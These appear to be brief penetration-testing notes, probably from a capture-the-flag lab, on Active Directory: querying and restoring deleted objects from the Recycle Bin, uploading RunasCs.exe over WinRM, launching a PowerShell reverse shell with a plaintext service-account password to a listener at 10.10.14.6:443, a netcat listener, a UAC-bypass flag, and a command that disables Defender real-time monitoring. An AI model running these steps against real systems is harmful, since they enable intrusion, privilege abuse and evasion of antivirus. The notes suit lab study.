## Check AD Recyclebin
```
Get-ADOptionalFeature 'Recycle Bin Feature'
```
## Check if any user has been deleted
```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
```
Restore a user based on it's Object GUID
```
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```
## Run Commands as another user
Download a copy of RunasCs.exe to a WinRM session
```
upload RunasCs.exe RunasCs.exe
```

Then execute a reverse shell:
```
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.6:443
```
User --bypass-uac if needed.

Prepare netcat on our machine:
```
rlwrap -cAr nc -lnvp 443
```

## Disable AV
```
Set-MpPreference -DisableRealtimeMonitoring $True
```